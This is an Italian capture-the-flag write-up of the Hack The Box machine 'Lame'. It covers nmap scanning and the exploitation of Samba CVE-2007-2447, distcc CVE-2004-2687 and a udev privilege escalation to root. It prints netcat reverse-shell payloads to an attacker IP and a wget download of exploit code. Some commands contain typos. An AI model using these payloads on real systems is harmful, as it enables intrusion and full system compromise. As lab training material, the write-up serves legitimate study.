# Lame

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.3
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Le porte aperte sono le seguenti:

* **Porta 21:** File Transfer Protocol \(FTP\) versione 2.3.4
* **Porta 22:** OpenSSH versione 4.7p1
* **Porte 139 e 445:** Samba v3.0.20-Debian

<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-1.png" />
</p>

<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-2.png" />
</p>

Prima di iniziare a lavorare su queste porte, lancio una scansione nmap più completa in background.

```text
sudo nmap -sC -sV -O -p- -oA /usr/share/nmap/full 10.10.10.3
```

Di seguito il risultato della seconda scansione:

<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-3.png" />
</p>

E' possibile notare la presenza di una nuova porta che non veniva mostrata nella scansione precedente.

* **Porta 3632**: distributed compiler daemon distcc versione 1.

Esco da questa fase con quattro differenti punti di ingresso da testare.

## Enumeration

In questa fase cerco di capire se qualcuno di questi servizi è configurato in modo errato o se presenta vulnerabilità note.

### 1) Porta 21 vsftpd v2.3.4

Una semplice ricerca su google mi mostra che questa versione è vulnerabile all'esecuzione di un comando backdoor che viene attivato inserendo una stringa come username che contiene i caratteri “:\)”.
Quando la backdoor viene attivata, la macchina di destinazione apre una shell sulla porta 6200.

E' possibile controllare l'effettiva vulnerabilità mediante uno script nmap.

<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-4.png" />
</p>

```text
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```

<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-5.png" />
</p>

Dall'output dello script capisco che non è possibile sfruttare questa vulnerabilità.

### 2) Porta 22 OpenSSH v4.7p1

Effettuando una rapida ricercaho trovato questo progetto: [OpenSSH 4.7p1 CVE-2008-5161 Exploit](https://github.com/pankajjarial360/OpenSSH_4.7p1).

Lo script openssh_4.7p1.py controlla la versione del servizio SSH per confermare che sia in esecuzione OpenSSH versione 4.7p1. Successivamente, imposta i parametri necessari per un attacco brute-force utilizzando un elenco di nomi utente e password presi da una specifica wordlist.

Una volta avviato e completato l'exploit, lo script recupera tutte le sessioni attive che sono state create e permette di interagire con esse.

Lancio lo script in background e proseguo con l'analisi dei restanti punti di ingresso.

```text
python openssh_4.7p1.py
```

<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-8.png" />
</p>

Questa strada richiedeva troppo tempo e per questo motivo l'esecuzione dello script è stata interrotta.

### 3) Porte 139 e 445 Samba v3.0.20-Debian

Utilizziamo smbclient per accedere al server SMB.

```text
smbclient -L 10.10.10.3
```
* **-L**: lista dei serzi disponibili sul server

Noto che la mia macchina è configurata in maniera tale da non connettersi alle versioni SMB precedenti (per motivi di sicurezza).

Per ovviare a questo problema modifico il comando nel modo seguente:

```text
smbclient -L 10.10.10.3 --option='client min protocol=NT1'
```
<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-6.png" />
</p>

**E' disponibile il login anonimo!**

Ora cerco di capire quali sono i permessi sui file condivisi.

```text
smbmap -H 10.10.10.3
```

* **-H**: IP dell'host

Scopro di avere accesso di tipo READ/WRITE sulla cartella tmp.

<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-7.png" />
</p>

Effettuando una ricerca veloce noto che questa versione del servizio è [vulnerabile](https://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-41384/Samba-Samba-3.0.20.html).

Cerco di sfruttare la vulnerabilità [CVE-2007–2447](https://www.cvedetails.com/cve/CVE-2007-2447/) che si basa su un problema legato all'invio di specifici metacaratteri.

```text
"/=`nohup " + payload.encoded + "`"
```

Prima di sfruttare la vulnerabilità, analizzo l'ultimo punto di ingresso rimasto.

### 3) Port 3632 distcc v1

Da una ricerca capisco che il servizio è vulnerabile all'esecuzione di codice da remoto.

Esiste uno script nmap che permette di verificare la presenza di questa vulnerabilità.

```text
nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3
```

**E' vulnerabile!**

<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-9.png" />
</p>

Quindi ho a disposizione due strade per cercare di bucare questa macchina.

## Exploitation

### 1) Samba

Mi metto in ascolto sulla porta 8080.

```text
nc -nlvp 8080
```

Eseguo il login sul client smb.

```text
smbclient //10.10.10.3/tmp --option='client min protocol=NT1'
```

Inserisco la sequenza di metacaratteri menzionata in precedenza.

```text
logon "/=`nohup nc -nv 10.10.14.5 8080 -e /bin/sh`"
```

**Ho ottenuto una shell dalla macchina lame con privilegi root!**

<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-10.png" />
</p>

### 2) Distcc

Utilizzo uno script nmap per sfruttare la vulnerabilità citata precedentemente.

Mi metto in ascolto sulla porta 4444.

```text
nc -nlvp 4444
```

Successivamente, utilizzo lo script nmap per dare vita a una reverse shell.

```text
nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.5 4444 -e /bin/bash'"
```

Questa volta non abbiamo una shell con privilegi root.

<p align="center">
  <img src="/Immagini/Linux-Box/Lame/lame-10.png" />
</p>

Per ottenere i privilegi root provo con la vulnerabilità [CVE 2009–1185](https://www.exploit-db.com/exploits/8572).

```text
searchsploit -m 8572.c
```

Avvio un server sulla mia macchina.

```text
python -m SimpleHTTPServer 9000
```

Trasferisco il file alla macchina lame.

```text
wget http://10.10.14.5:9000/8572.c
```

Compilo l'exploit.

```text
gcc 8572.c -o 8572
```

Per eseguirlo mi servono devo:
* Trovare il PID del servizio
* Creare un file nella cartella /tmp e aggiungere una reverse shell in esso

Per ottenre il PID eseguo il seguente comando:

```text
ps -aux | grep devd
```
Creo il file **run** in /tmp e aggiungo una reverse shell all'interno.

```text
cd /tempo
echo '#/bin/bash' > run
echo 'nc -nv 10.10.14.5' 4445 -e /bin/bash' >> run
```

Mi metto in ascolto sulla porta 4445.

```text
nc -nlvp 4445
```

Eseguo l'exploit.

```text
./8572 2661
```

**Ed ecco l'utenza root!**
